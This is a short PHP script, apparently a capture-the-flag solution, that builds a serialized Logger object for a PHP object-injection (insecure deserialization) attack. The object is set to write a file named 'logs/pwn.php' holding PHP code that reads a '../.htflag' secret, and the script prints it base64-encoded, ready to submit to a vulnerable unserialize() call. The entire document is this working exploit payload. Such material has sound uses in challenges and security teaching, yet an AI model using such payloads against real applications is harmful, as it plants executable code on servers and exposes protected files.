<?php

class Logger {
  protected $initMessage;
  protected $logFile;
  protected $endMessage;

  public function __construct() {
    $this->initMessage = "";
    $this->logFile = "logs/pwn.php";
    $this->endMessage = "<?php echo file_get_contents('../.htflag');";
  }
}

$l = new Logger();

#echo serialize($l), "\n";
echo base64_encode(serialize($l)), "\n";
